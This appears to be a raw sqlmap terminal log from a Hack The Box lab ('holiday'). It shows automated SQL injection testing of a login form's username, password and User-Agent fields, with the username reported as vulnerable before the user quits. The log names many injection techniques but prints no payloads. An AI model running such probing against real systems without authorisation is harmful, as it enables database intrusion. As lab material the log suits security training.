[13:39:31] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'                                                                              
[13:39:36] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'          
[13:39:41] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns' 
[13:39:45] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'         
[13:39:50] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[13:39:55] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'         
[13:40:00] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[13:40:04] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'         
[13:40:09] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[13:40:15] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'        
[13:40:20] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'                                                                                
[13:40:26] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval                                       
[13:40:26] [INFO] checking if the injection point on POST parameter 'username' is a false positive                                                               
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y                                                                
[13:41:03] [INFO] testing if POST parameter 'password' is dynamic               
[13:41:33] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                                            
[13:43:04] [CRITICAL] connection timed out to the target URL                    
[13:43:04] [WARNING] POST parameter 'password' does not appear to be dynamic    
[13:43:04] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable                                                         
[13:43:04] [INFO] testing for SQL injection on POST parameter 'password'        
[13:43:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'    
[13:43:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'     
[13:43:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'                                                                                
[13:43:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'                                                                
[13:44:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'                                                                 
[13:44:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'                                                                           
[13:44:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'                                                                            
[13:44:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'                                                                      
[13:44:26] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                             
[13:44:26] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'      
[13:44:26] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'                                                                      
[13:44:27] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'      
[13:44:27] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'                                                                      
[13:44:27] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause' 
[13:44:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'                                                                     
[13:44:42] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'                                                                      
[13:44:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'                                                                
[13:44:58] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'                                                         
[13:45:36] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                                            
[13:47:06] [CRITICAL] connection timed out to the target URL                    
[13:47:24] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'                                                
[13:47:34] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'                                                 
[13:47:57] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'                                                     
[13:48:11] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'                                                      
[13:48:35] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'                                                
[13:48:53] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'                                                 
[13:49:37] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                                            
[13:51:07] [CRITICAL] connection timed out to the target URL                    
[13:51:19] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'                                                                             
[13:51:20] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'                                                            
[13:51:20] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)' 
[13:51:20] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'                                                                 
[13:51:21] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'                                                                             
[13:51:22] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'                                                            
[13:51:22] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'                                                                         
[13:51:23] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'                                                        
[13:51:23] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'                                                                          
[13:51:23] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'                                                         
[13:51:23] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'  
[13:51:35] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'   
[13:51:35] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                          
[13:51:53] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'                                                               
[13:52:12] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                                      
[13:52:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'                                                                           
[13:52:52] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                              
[13:53:07] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'                                                                   
[13:53:56] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                                            
[13:55:26] [CRITICAL] connection timed out to the target URL                    
[13:55:35] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                    
[13:55:45] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                     
[13:55:55] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                             
[13:56:06] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                              
[13:56:18] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                                
[13:56:29] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                                 
[13:56:40] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                    
[13:56:49] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'                                                                         
[13:56:59] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'                                                                                
[13:57:03] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'                                                                          
[13:57:09] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'                                                                       
[13:57:09] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'  
[13:57:09] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'                                                                           
[13:57:10] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[13:57:10] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'                                                                             
[13:57:10] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'                                                                          
[13:57:11] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'                                                               
[13:57:11] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'                                                                           
[13:57:11] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'                                                                   
[13:57:12] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'                                                                         
[13:57:12] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'                                                                  
[13:57:12] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'                                                                     
[13:57:13] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'                                                                         
[13:57:13] [INFO] testing 'MySQL inline queries'                                
[13:57:13] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'           
[13:57:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries'                     
[13:57:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'                                                                              
[13:57:29] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'       
[13:59:44] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'                                                                               
[13:59:50] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'        
[13:59:59] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'  
[14:00:12] [INFO] POST parameter 'password' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable                                        
[14:00:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'        
[14:00:17] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'                                                                                
[14:00:22] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'       
[14:00:26] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'                                                                               
[14:00:31] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'       
[14:00:35] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'                                                                               
[14:00:39] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'       
[14:00:44] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'                                                                               
[14:00:48] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'      
[14:00:55] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'                                                                              
[14:01:01] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'          
[14:01:05] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns' 
[14:01:11] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'         
[14:01:17] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[14:01:22] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'         
[14:01:25] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[14:01:29] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'         
[14:01:33] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[14:01:39] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'        
[14:02:12] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                                            
[14:03:42] [CRITICAL] connection timed out to the target URL                    
[14:03:50] [INFO] target URL appears to be UNION injectable with 99 columns     
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y                                    
[14:15:47] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                               
[14:18:11] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                                            
[14:19:41] [CRITICAL] connection timed out to the target URL                    
[14:20:41] [INFO] checking if the injection point on POST parameter 'password' is a false positive                                                               
[14:20:44] [WARNING] false positive or unexploitable injection point detected   
[14:20:44] [WARNING] POST parameter 'password' does not seem to be injectable   
[14:20:44] [INFO] testing if parameter 'User-Agent' is dynamic                  
[14:20:44] [INFO] parameter 'User-Agent' appears to be dynamic                  
[14:20:44] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable                                                            
[14:20:45] [INFO] testing for SQL injection on parameter 'User-Agent'           
[14:20:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'    
[14:21:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'     
[14:22:18] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                                            
[14:23:48] [CRITICAL] connection timed out to the target URL                    
[14:24:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'                                                                                
[14:24:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'                                                                
[14:24:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'                                                                 
[14:24:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'                                                                           
[14:25:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'                                                                            
[14:25:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'                                                                      
[14:25:09] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                             
[14:25:10] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'      
[14:25:11] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'                                                                      
[14:25:12] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'      
[14:25:14] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'                                                                      
[14:25:14] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause' 
[14:25:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'                                                                     
[14:25:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'                                                                      
[14:25:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'                                                                
[14:26:28] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                                            
[14:27:58] [CRITICAL] connection timed out to the target URL                    
[14:28:19] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'                                                         
[14:28:29] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'                                                
[14:28:39] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'                                                 
[14:29:03] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'                                                     
[14:29:13] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'                                                      
[14:29:35] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'                                                
[14:29:45] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'                                                 
[14:30:03] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'                                                                             
[14:30:04] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'                                                            
[14:30:04] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)' 
[14:30:05] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'                                                                 
[14:30:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'                                                                             
[14:30:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'                                                            
[14:30:07] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'                                                                         
[14:30:07] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'                                                        
[14:30:08] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'                                                                          
[14:30:08] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'                                                         
[14:30:08] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'  
[14:30:38] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                                            
[14:32:08] [CRITICAL] connection timed out to the target URL                    
[14:32:34] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'   
[14:32:34] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                          
[14:32:54] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'                                                               
[14:33:11] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                                      
[14:33:26] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'                                                                           
[14:33:45] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                              
[14:34:03] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'                                                                   
[14:34:50] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                                            
[14:36:20] [CRITICAL] connection timed out to the target URL                    
[14:36:29] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                    
[14:36:49] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                     
[14:37:08] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                             
[14:37:26] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                              
[14:37:45] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                                
[14:38:07] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                                 
[14:38:25] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                    
[14:38:56] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                                            
[14:40:26] [CRITICAL] connection timed out to the target URL                    
[14:40:59] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'                                                                         
[14:41:20] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'                                                                                
[14:41:32] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'                                                                          
[14:41:46] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'                                                                       
[14:41:47] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'  
[14:41:47] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'                                                                           
[14:41:48] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[14:41:48] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'                                                                             
[14:41:49] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'                                                                          
[14:41:49] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'                                                               
[14:41:49] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'                                                                           
[14:41:50] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'                                                                   
[14:41:51] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'                                                                         
[14:41:52] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'                                                                  
[14:41:52] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'                                                                     
[14:41:53] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'                                                                         
[14:41:54] [INFO] testing 'MySQL inline queries'                                
[14:41:54] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'           
[14:42:02] [INFO] testing 'MySQL >= 5.0.12 stacked queries'                     
[14:42:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'                                                                              
[14:42:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'       
[14:42:37] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'                                                                               
[14:45:04] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'        
[14:45:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'  
[14:45:43] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'   
[14:46:04] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'        
[14:46:23] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'         
[14:46:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'                                                                               
[14:46:43] [WARNING] user aborted during detection phase                        
how do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(c)hange verbosity/(q)uit] q                                             
[14:46:45] [WARNING] HTTP error codes detected during run:                      
404 (Not Found) - 428 times             
[14:46:45] [ERROR] user quit            

[*] ending @ 14:46:45 /2020-01-16/      

root@parrot:~/hackthebox/holiday#       
